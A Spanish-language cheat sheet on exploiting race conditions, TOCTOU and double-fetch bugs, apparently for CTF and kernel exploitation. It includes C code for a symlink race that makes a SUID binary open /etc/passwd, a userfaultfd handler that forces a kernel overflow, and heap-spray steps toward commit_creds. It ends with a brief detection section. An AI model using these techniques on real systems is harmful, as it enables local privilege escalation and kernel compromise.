# Race conditions, TOCTOU y double-fetch (cheat sheet)

Bugs de concurrencia: dos operaciones que asumen un estado que cambia entre medias. Ganar la
carrera de forma fiable es la parte dificil; hay trucos para "serializarla".

## TOCTOU (Time-Of-Check to Time-Of-Use)
Se comprueba una condicion (permisos, tamano, ruta) y luego se usa el recurso; entre ambos un
segundo hilo/proceso cambia el recurso. Ejemplo clasico: check de un fichero por ruta y luego
open(); cambias el symlink en medio -> abres otro fichero (privilegios).

## Double-fetch
El kernel (o un programa) lee un valor de memoria de usuario DOS veces: una para validar, otra
para usar. Cambias el valor entre las dos lecturas -> pasa la validacion con un valor y se usa
otro (p.ej. tamano pequeno al validar, enorme al copiar -> overflow). Comun en syscalls/ioctls
que releen `copy_from_user`.

## Ganar la carrera de forma fiable
- CPU pinning + spinning: hilos en cores distintos, bucle apretado cambiando el valor.
- userfaultfd (kernel/CTF): registras una pagina con userfaultfd; cuando el kernel hace fault
  al leerla, se BLOQUEA esperandote -> tienes tiempo ilimitado para reescribir la pagina antes
  del segundo fetch. Serializa la race a ~100% de fiabilidad.
- FUSE: un filesystem en userspace que retrasa la lectura, mismo efecto que userfaultfd.

## En kernel: race -> UAF -> spray
Una race suele producir un UAF de un objeto de slab. Luego se hace heap spray para reclamar
ese hueco con un objeto controlado:
- setxattr + userfaultfd: controla el tamano y el tiempo de vida de la asignacion (hasta
  kmalloc-8). Spray masivo de msg_msg (msgsnd) para ocupar el objeto liberado.
- objetivo tras reclamar: un objeto con function pointer (tty_struct, timerfd_ctx, pipe_buffer
  ops) -> secuestrar el flujo -> commit_creds ([[kernel-pwn]]).
- Cuidado con heap quarantine (retrasa la reutilizacion): puede impedir el reclaim rapido.

## Ejemplo: TOCTOU symlink race (userland)
Un binario SUID valida `access("/tmp/x", W_OK)` y luego `open("/tmp/x")`. Alternas el path
entre un fichero tuyo (pasa el check) y un symlink a un fichero privilegiado (se usa):
```c
// dos hilos apretados: uno hace flip del symlink, otro invoca el binario en bucle.
#include <unistd.h>
void *flip(void *_) {
  for (;;) {                          // pin a un core distinto con sched_setaffinity
    unlink("/tmp/x"); symlink("/home/me/own", "/tmp/x");   // pasa access()
    unlink("/tmp/x"); symlink("/etc/passwd", "/tmp/x");    // gana -> open() abre passwd
  }
}
// gana cuando el check cae en 'own' y el use cae en 'passwd'. Repite miles de veces.
```
Trucos de fiabilidad: `renameat2(..., RENAME_EXCHANGE)` intercambia dos paths de forma atomica
(swap fiable sin ventana intermedia), y pinar los hilos en cores separados.

## Ejemplo: ganar un double-fetch con userfaultfd (kernel/CTF)
En vez de rezar por el timing, BLOQUEAS el segundo fetch: registras la pagina del usuario con
userfaultfd; cuando el kernel la lee, hace page fault y se para esperandote -> reescribes el
valor y solo entonces sirves la pagina.
```c
// 1) crear uffd y registrar la pagina que el kernel va a re-leer
long uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API }; ioctl(uffd, UFFDIO_API, &api);
struct uffdio_register reg = { .range = { (unsigned long)page, PAGE_SIZE },
                               .mode = UFFDIO_REGISTER_MODE_MISSING };
ioctl(uffd, UFFDIO_REGISTER, &reg);

// 2) hilo handler: al primer fetch (fault) el kernel se BLOQUEA aqui.
void *handler(void *_) {
  struct uffd_msg msg; struct pollfd p = { uffd, POLLIN, 0 };
  poll(&p, 1, -1); read(uffd, &msg, sizeof msg);   // llega el fault del 1er fetch
  ((size_t*)tmp)[0] = HUGE_SIZE;                    // <-- reescribe: pequeno->enorme
  struct uffdio_copy c = { .dst = msg.arg.pagefault.address & ~0xffful,
                           .src = (unsigned long)tmp, .len = PAGE_SIZE };
  ioctl(uffd, UFFDIO_COPY, &c);                     // sirve la pagina -> 2o fetch lee HUGE_SIZE
  return 0;
}
// 3) el syscall/ioctl valida con el valor pequeno (check) y copia con el enorme (use) -> overflow.
```
Sin userfaultfd (p.ej. si esta restringido con `unprivileged_userfaultfd=0`): usa FUSE, que
retrasa la lectura con el mismo efecto de serializacion.

## Deteccion
- estatico: mismo puntero de usuario leido dos veces; check y uso separados por una operacion
  que cede CPU (lock, copy, syscall).
- dinamico: fuzzing con hilos; sanitizers (KCSAN para data races en kernel).
